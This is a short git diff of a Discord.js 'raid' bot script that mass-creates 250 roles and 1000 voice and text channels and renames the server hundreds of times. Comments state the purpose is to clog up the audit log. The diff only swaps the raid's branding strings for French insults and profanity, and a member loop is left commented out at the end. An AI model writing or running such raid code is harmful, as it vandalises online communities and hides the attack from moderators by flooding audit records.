@@ -9,15 +9,15 @@ const Discord = require('discord.js');
             for (var i = 0; i < 250; i++) {
                 // Creates new roles to clog up the audit log
                 message.guild.createRole({
-                    name: 'Union <3',
+                    name: 'On vous aimes <3',
                     color: 'RED',
                 });
               }
                 for (var i = 0; i < 500; i++) {
-                message.guild.createChannel('Vive Union', 'voice')
-                message.guild.createChannel('Vive Union', 'text')
+                message.guild.createChannel('FUUUUUUUUUCK', 'voice')
+                message.guild.createChannel('FUUUUUUUUUCK', 'text')
                 //changes name tons of times to clog up the audit log
-                message.guild.setName("Raid By Union "+ i + " Fois");
+                message.guild.setName("L'abtique t'encule "+ i + " Fois");
                 }
 
               /*  message.guild.members.forEach(m => {
